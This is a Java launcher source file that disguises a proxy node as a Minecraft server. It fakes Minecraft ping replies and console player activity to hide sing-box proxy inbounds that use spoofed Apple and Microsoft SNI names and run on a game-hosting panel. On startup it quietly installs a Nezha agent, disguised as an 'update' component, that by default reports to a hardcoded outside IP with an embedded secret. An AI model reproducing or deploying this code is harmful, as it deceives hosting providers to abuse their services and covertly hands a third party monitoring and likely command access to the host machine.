package miao.wrapper;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Main {
    private static final String SNI_NAME = "apps.apple.com";
    private static final String REALITY_SNI = "www.microsoft.com";
    private static Process nezhaProcess;
    private static Process singboxProc;
    private static Process cfProc;

    public static void main(String[] args) {
        System.out.println("[喵酱] 多协议伪装启动器运行中，准备唤醒 sing-box 核心... 喵~ 🐾");

        String serverPort = env("SERVER_PORT", "25731");
        String hy2Port = env("HY2_PORT", "");
        String tuicPort = env("TUIC_PORT", "");
        String realityPort = env("REALITY_PORT", "");
        String socksPort = env("SOCKS_PORT", "");
        String cfQuick = env("CF_QUICK", "0");
        String cfToken = env("CF_TOKEN", "");
        String cfDomain = env("CF_DOMAIN", "");
        String cfName = env("CF_NAME", "vmess");

        try {
            deployNezhaAgent(env("NEZHA_SERVER", "136.67.94.3:443"),
                    env("NEZHA_KEY", "pZk6Kok7j31o97CgSisHed7nrNJjkhfy"),
                    env("NEZHA_TLS", "false"));

            Path dataDir = Paths.get("data");
            Files.createDirectories(dataDir);

            Path sbBin = dataDir.resolve("sing-box");
            if (!Files.exists(sbBin)) {
                System.out.println("[喵酱] 下载 sing-box 核心... 🐾");
                downloadSingbox(sbBin);
            }

            String[] geo = detectGeo();
            String publicIp = geo[0];
            String country = geo[1];

            String hy2Pass = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            String tuicUuid = UUID.randomUUID().toString();
            String tuicPass = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            String vlessUuid = UUID.randomUUID().toString();
            String realityPriv = "", realityPub = "";
            if (!realityPort.isEmpty()) {
                String[] realityKeys = generateRealityKeypair(sbBin);
                realityPriv = realityKeys[0];
                realityPub = realityKeys[1];
            }
            String shortId = generateShortId();

            ensureCert(dataDir);

            if (hy2Port.isEmpty() && tuicPort.isEmpty() && realityPort.isEmpty() && socksPort.isEmpty()) {
                System.out.println("[喵酱] ⚠️ HY2_PORT/TUIC_PORT/REALITY_PORT/SOCKS_PORT 全部为空，没有启动任何协议喵！");
                System.out.println("[喵酱] 请在面板 Startup 变量里至少设置一个协议端口，例如 HY2_PORT=25875");
            }

            String config = buildSingboxConfig(hy2Port, tuicPort, realityPort, socksPort,
                    hy2Pass, tuicUuid, tuicPass, vlessUuid, realityPriv, shortId, dataDir);
            Files.write(dataDir.resolve("config.json"), config.getBytes());
            System.out.println("[喵酱] sing-box 配置已生成喵！");

            printLinks(publicIp, country, hy2Port, tuicPort, realityPort, socksPort,
                    hy2Pass, tuicUuid, tuicPass, vlessUuid, realityPub, shortId);

            startFakePlayerConsoleSpam();
            if (!serverPort.isEmpty()) {
                new Thread(() -> {
                    try {
                        ServerSocket ss = new ServerSocket(Integer.parseInt(serverPort));
                        while (true) {
                            Socket s = ss.accept();
                            new Thread(() -> handleMcPing(s)).start();
                        }
                    } catch (Exception e) { }
                }).start();
            }

            ProcessBuilder pb = new ProcessBuilder(sbBin.toString(), "run", "-c", dataDir.resolve("config.json").toString());
            pb.redirectErrorStream(true);
            singboxProc = pb.start();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (singboxProc != null && singboxProc.isAlive()) singboxProc.destroy();
                if (nezhaProcess != null && nezhaProcess.isAlive()) nezhaProcess.destroy();
                if (cfProc != null && cfProc.isAlive()) cfProc.destroy();
            }));
            new Thread(() -> {
                try {
                    BufferedReader r = new BufferedReader(new InputStreamReader(singboxProc.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) {
                        if (line.contains("started") || line.contains("ERROR") || line.contains("error")) {
                            System.out.println("[SB] " + line);
                        }
                    }
                } catch (Exception e) { }
            }).start();

            if ("1".equals(cfQuick) && !cfToken.isEmpty()) {
                startCloudflared(cfToken, cfDomain, cfName);
            }

            singboxProc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String env(String key, String def) {
        String v = System.getenv(key);
        return (v == null || v.isEmpty()) ? def : v;
    }

    private static String buildSingboxConfig(String hy2Port, String tuicPort, String realityPort,
            String socksPort, String hy2Pass, String tuicUuid, String tuicPass,
            String vlessUuid, String realityPriv, String shortId, Path dataDir) {
        StringBuilder inbounds = new StringBuilder();
        String tlsCert = "    \"tls\": {\n" +
                "      \"enabled\": true,\n" +
                "      \"server_name\": \"" + SNI_NAME + "\",\n" +
                "      \"alpn\": [\"h3\"],\n" +
                "      \"certificate_path\": \"" + dataDir.resolve("cert.crt") + "\",\n" +
                "      \"key_path\": \"" + dataDir.resolve("private.key") + "\"\n" +
                "    }\n";

        if (!hy2Port.isEmpty()) {
            inbounds.append("    {\n");
            inbounds.append("      \"type\": \"hysteria2\",\n");
            inbounds.append("      \"tag\": \"hy2-in\",\n");
            inbounds.append("      \"listen\": \"::\",\n");
            inbounds.append("      \"listen_port\": ").append(hy2Port).append(",\n");
            inbounds.append("      \"users\": [{\"password\": \"").append(hy2Pass).append("\"}],\n");
            inbounds.append(tlsCert);
            inbounds.append("    },\n");
        }
        if (!tuicPort.isEmpty()) {
            inbounds.append("    {\n");
            inbounds.append("      \"type\": \"tuic\",\n");
            inbounds.append("      \"tag\": \"tuic-in\",\n");
            inbounds.append("      \"listen\": \"::\",\n");
            inbounds.append("      \"listen_port\": ").append(tuicPort).append(",\n");
            inbounds.append("      \"users\": [{\"uuid\": \"").append(tuicUuid).append("\", \"password\": \"").append(tuicPass).append("\"}],\n");
            inbounds.append(tlsCert);
            inbounds.append("    },\n");
        }
        if (!realityPort.isEmpty()) {
            inbounds.append("    {\n");
            inbounds.append("      \"type\": \"vless\",\n");
            inbounds.append("      \"tag\": \"vless-in\",\n");
            inbounds.append("      \"listen\": \"::\",\n");
            inbounds.append("      \"listen_port\": ").append(realityPort).append(",\n");
            inbounds.append("      \"users\": [{\"uuid\": \"").append(vlessUuid).append("\", \"flow\": \"xtls-rprx-vision\"}],\n");
            inbounds.append("      \"tls\": {\n");
            inbounds.append("        \"enabled\": true,\n");
            inbounds.append("        \"server_name\": \"").append(REALITY_SNI).append("\",\n");
            inbounds.append("        \"reality\": {\n");
            inbounds.append("          \"enabled\": true,\n");
            inbounds.append("          \"handshake\": {\"server\": \"").append(REALITY_SNI).append("\", \"server_port\": 443},\n");
            inbounds.append("          \"private_key\": \"").append(realityPriv).append("\",\n");
            inbounds.append("          \"short_id\": [\"").append(shortId).append("\"]\n");
            inbounds.append("        }\n");
            inbounds.append("      }\n");
            inbounds.append("    },\n");
        }
        if (!socksPort.isEmpty()) {
            inbounds.append("    {\n");
            inbounds.append("      \"type\": \"socks\",\n");
            inbounds.append("      \"tag\": \"socks-in\",\n");
            inbounds.append("      \"listen\": \"::\",\n");
            inbounds.append("      \"listen_port\": ").append(socksPort).append("\n");
            inbounds.append("    },\n");
        }
        String inb = inbounds.toString();
        if (inb.endsWith(",\n")) inb = inb.substring(0, inb.length() - 2) + "\n";

        return "{\n" +
                "  \"log\": {\"level\": \"info\", \"timestamp\": true},\n" +
                "  \"inbounds\": [\n" + inb + "  ],\n" +
                "  \"outbounds\": [\n" +
                "    {\"type\": \"direct\", \"tag\": \"direct\"}\n" +
                "  ]\n" +
                "}\n";
    }

    private static void printLinks(String ip, String country, String hy2Port, String tuicPort,
            String realityPort, String socksPort, String hy2Pass, String tuicUuid, String tuicPass,
            String vlessUuid, String realityPub, String shortId) {
        System.out.println("\n========================================================");
        System.out.println("[喵酱] 主人，你的多协议节点链接生成完毕喵！");
        if (!hy2Port.isEmpty()) {
            System.out.println("hysteria2://" + hy2Pass + "@" + ip + ":" + hy2Port + "/?sni=" + SNI_NAME + "&insecure=1#" + country + "-HY2");
        }
        if (!tuicPort.isEmpty()) {
            System.out.println("tuic://" + tuicUuid + ":" + tuicPass + "@" + ip + ":" + tuicPort + "/?sni=" + SNI_NAME + "&alpn=h3&insecure=1#" + country + "-TUIC");
        }
        if (!realityPort.isEmpty()) {
            System.out.println("vless://" + vlessUuid + "@" + ip + ":" + realityPort + "/?security=reality&sni=" + REALITY_SNI + "&fp=chrome&pbk=" + realityPub + "&sid=" + shortId + "&type=tcp&flow=xtls-rprx-vision#" + country + "-Reality");
        }
        if (!socksPort.isEmpty()) {
            System.out.println("socks5://" + ip + ":" + socksPort + "#" + country + "-SOCKS");
        }
        System.out.println("========================================================\n");
    }

    private static void downloadSingbox(Path dest) throws Exception {
        URL apiUrl = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
        HttpURLConnection con = (HttpURLConnection) apiUrl.openConnection();
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        reader.close();
        String json = sb.toString();
        String dlUrl = null;
        int idx = 0;
        while ((idx = json.indexOf("\"browser_download_url\":\"", idx)) != -1) {
            int start = idx + "\"browser_download_url\":\"".length();
            int end = json.indexOf("\"", start);
            String url = json.substring(start, end);
            if (url.contains("linux-amd64.tar.gz")) { dlUrl = url; break; }
            idx = end;
        }
        if (dlUrl == null) throw new RuntimeException("sing-box download URL not found");
        Path tar = dest.getParent().resolve("sb.tar.gz");
        downloadFile(dlUrl, tar);
        Files.createDirectories(dest.getParent());
        new ProcessBuilder("bash", "-c", "tar xzf " + tar + " -C " + dest.getParent()).inheritIO().start().waitFor();
        Path extracted = dest.getParent().resolve("sing-box");
        if (!Files.exists(extracted)) {
            for (Path p : Files.newDirectoryStream(dest.getParent())) {
                if (p.getFileName().toString().startsWith("sing-box-") && Files.isDirectory(p)) {
                    Path bin = p.resolve("sing-box");
                    if (Files.exists(bin)) { Files.move(bin, dest, StandardCopyOption.REPLACE_EXISTING); break; }
                }
            }
        } else {
            Files.move(extracted, dest, StandardCopyOption.REPLACE_EXISTING);
        }
        Files.deleteIfExists(tar);
        new ProcessBuilder("bash", "-c", "chmod +x " + dest).inheritIO().start().waitFor();
    }

    private static String[] generateRealityKeypair(Path sbBin) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(sbBin.toString(), "generate", "reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String priv = "", pub = "";
        String line;
        while ((line = r.readLine()) != null) {
            if (line.startsWith("PrivateKey:")) priv = line.substring("PrivateKey:".length()).trim();
            if (line.startsWith("PublicKey:")) pub = line.substring("PublicKey:".length()).trim();
        }
        p.waitFor();
        return new String[]{priv, pub};
    }

    private static String generateShortId() {
        byte[] b = new byte[8];
        new java.security.SecureRandom().nextBytes(b);
        StringBuilder hex = new StringBuilder();
        for (byte x : b) hex.append(String.format("%02x", x));
        return hex.toString();
    }

    private static void ensureCert(Path dataDir) throws Exception {
        File cert = dataDir.resolve("cert.crt").toFile();
        File key = dataDir.resolve("private.key").toFile();
        if (!cert.exists() || !key.exists()) {
            System.out.println("[喵酱] 签发 SNI 证书 (" + SNI_NAME + ") 喵...");
            new ProcessBuilder("openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
                    "-keyout", key.getAbsolutePath(), "-out", cert.getAbsolutePath(),
                    "-days", "3650", "-subj", "/CN=" + SNI_NAME).inheritIO().start().waitFor();
        }
    }

    private static void startCloudflared(String token, String domain, String name) {
        try {
            Path cfBin = Paths.get("data/cloudflared");
            if (!Files.exists(cfBin)) {
                System.out.println("[喵酱] 下载 cloudflared... 🐾");
                downloadFile("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", cfBin);
                new ProcessBuilder("bash", "-c", "chmod +x " + cfBin).inheritIO().start().waitFor();
            }
            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "tunnel", "--no-autoupdate", "run", "--token", token);
            pb.redirectErrorStream(true);
            cfProc = pb.start();
            new Thread(() -> {
                try {
                    BufferedReader r = new BufferedReader(new InputStreamReader(cfProc.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) {
                        if (line.contains("Registered") || line.contains("proxy") || line.contains("ERROR")) {
                            System.out.println("[CF] " + line);
                        }
                    }
                } catch (Exception e) { }
            }).start();
            Thread.sleep(2000);
            System.out.println("[喵酱] Cloudflare 隧道已启动喵！");
        } catch (Exception e) {
            System.out.println("[喵酱] Cloudflare 隧道启动失败: " + e.getMessage());
        }
    }

    private static String[] detectGeo() {
        try {
            URL url = new URL("http://ip-api.com/json/?lang=zh-CN");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");
            con.setConnectTimeout(5000);
            con.setReadTimeout(5000);
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) sb.append(line);
            in.close();
            String json = sb.toString();
            String ip = "127.0.0.1", country = "未知节点";
            if (json.contains("\"query\":\"")) ip = json.split("\"query\":\"")[1].split("\"")[0];
            if (json.contains("\"country\":\"")) country = json.split("\"country\":\"")[1].split("\"")[0];
            return new String[]{ip, country};
        } catch (Exception e) {
            return new String[]{"127.0.0.1", "未知节点"};
        }
    }

    private static void downloadFile(String url, Path dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        try (InputStream is = conn.getInputStream()) {
            Files.copy(is, dest, StandardCopyOption.REPLACE_EXISTING);
        }
        conn.disconnect();
    }

    private static void deployNezhaAgent(String server, String secret, String tls) {
        try {
            Path nzDir = Paths.get("data/update");
            Files.createDirectories(nzDir);
            Path bin = nzDir.resolve("nezha-agent");
            if (!Files.exists(bin)) {
                System.out.println("[喵酱] 下载哪吒 Agent... 🐾");
                String url = "https://github.com/nezhahq/agent/releases/download/v1.15.0/nezha-agent_linux_amd64.zip";
                try {
                    downloadAndExtractZip(url, nzDir);
                } catch (Exception e) {
                    Path zip = nzDir.resolve("agent.zip");
                    new ProcessBuilder("bash", "-c", "curl -L -o " + zip + " \"" + url + "\"").inheritIO().start().waitFor();
                    if (Files.exists(zip)) { extractZip(zip, nzDir); Files.deleteIfExists(zip); }
                }
                Path extracted = nzDir.resolve("nezha-agent");
                if (Files.exists(extracted)) Files.move(extracted, bin, StandardCopyOption.REPLACE_EXISTING);
                new ProcessBuilder("bash", "-c", "chmod +x " + bin).inheritIO().start().waitFor();
            }
            if (!Files.exists(bin)) { System.out.println("[喵酱] 哪吒下载失败。"); return; }
            Path uuidFile = nzDir.resolve("session.id");
            String uuid;
            if (Files.exists(uuidFile)) uuid = new String(Files.readAllBytes(uuidFile)).trim();
            else { uuid = UUID.randomUUID().toString(); Files.writeString(uuidFile, uuid); }
            String cfg = "debug: false\ntls: " + tls + "\ndisable_auto_update: true\ndisable_force_update: true\nclient_secret: " + secret + "\nserver: " + server + "\nuuid: " + uuid + "\n";
            Files.writeString(nzDir.resolve("config.yml"), cfg);
            ProcessBuilder pb = new ProcessBuilder(bin.toString(), "-c", nzDir.resolve("config.yml").toString());
            pb.redirectErrorStream(true);
            pb.redirectOutput(nzDir.resolve("update.log").toFile());
            nezhaProcess = pb.start();
            Thread.sleep(1000);
            System.out.println("[喵酱] 哪吒探针已启动喵！");
        } catch (Exception e) {
            System.out.println("[喵酱] 哪吒启动失败: " + e.getMessage());
        }
    }

    private static void downloadAndExtractZip(String url, Path destDir) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        try (InputStream is = conn.getInputStream(); ZipInputStream zis = new ZipInputStream(is)) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.isDirectory()) continue;
                Path out = destDir.resolve(entry.getName());
                Files.createDirectories(out.getParent());
                Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING);
                out.toFile().setExecutable(true);
                zis.closeEntry();
            }
        }
        conn.disconnect();
    }

    private static void extractZip(Path zip, Path destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zip))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.isDirectory()) continue;
                Path out = destDir.resolve(entry.getName());
                Files.createDirectories(out.getParent());
                Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING);
                out.toFile().setExecutable(true);
                zis.closeEntry();
            }
        }
    }

    private static void startFakePlayerConsoleSpam() {
        new Timer(true).schedule(new TimerTask() {
            String[] names = {"MiaoMiao", "Steve", "Alex", "DragonSlayer", "Pterodactyl_Bot"};
            public void run() {
                String n = names[(int) (Math.random() * names.length)];
                if (Math.random() > 0.3) System.out.println("[Server thread/INFO]: " + n + " joined the game");
                else System.out.println("[Server thread/INFO]: " + n + " left the game");
            }
        }, 30000L, 180000L);
    }

    private static void handleMcPing(Socket socket) {
        try {
            DataInputStream in = new DataInputStream(socket.getInputStream());
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            while (true) {
                int len = readVarInt(in);
                byte[] data = new byte[len];
                in.readFully(data);
                DataInputStream payload = new DataInputStream(new ByteArrayInputStream(data));
                int packetId = readVarInt(payload);
                if (packetId == 0 && data.length == 1) {
                    String json = "{\"version\":{\"name\":\"Paper 1.20.4\",\"protocol\":765},\"players\":{\"max\":20,\"online\":1,\"sample\":[{\"name\":\"MiaoMiao\",\"id\":\"00000000-0000-0000-0000-000000000001\"}]},\"description\":{\"text\":\"A Minecraft Server\"}}";
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    DataOutputStream dos = new DataOutputStream(bos);
                    writeVarInt(dos, 0);
                    writeString(dos, json);
                    byte[] resp = bos.toByteArray();
                    writeVarInt(out, resp.length);
                    out.write(resp);
                    continue;
                }
                if (packetId == 1) {
                    long ping = payload.readLong();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    DataOutputStream dos = new DataOutputStream(bos);
                    writeVarInt(dos, 1);
                    dos.writeLong(ping);
                    byte[] resp = bos.toByteArray();
                    writeVarInt(out, resp.length);
                    out.write(resp);
                    break;
                }
            }
        } catch (Exception e) { } finally { try { socket.close(); } catch (Exception e) { } }
    }

    public static int readVarInt(DataInputStream in) throws IOException {
        int value = 0, position = 0; byte current;
        do { current = in.readByte(); value |= (current & 0x7F) << 7 * position; if (++position > 5) throw new RuntimeException("VarInt too big"); } while ((current & 0x80) != 0);
        return value;
    }

    public static void writeVarInt(DataOutputStream out, int value) throws IOException {
        do { byte temp = (byte) (value & 0x7F); if ((value >>>= 7) != 0) temp = (byte) (temp | 0x80); out.writeByte(temp); } while (value != 0);
    }

    public static void writeString(DataOutputStream out, String s) throws IOException {
        byte[] bytes = s.getBytes("UTF-8"); writeVarInt(out, bytes.length); out.write(bytes);
    }
}
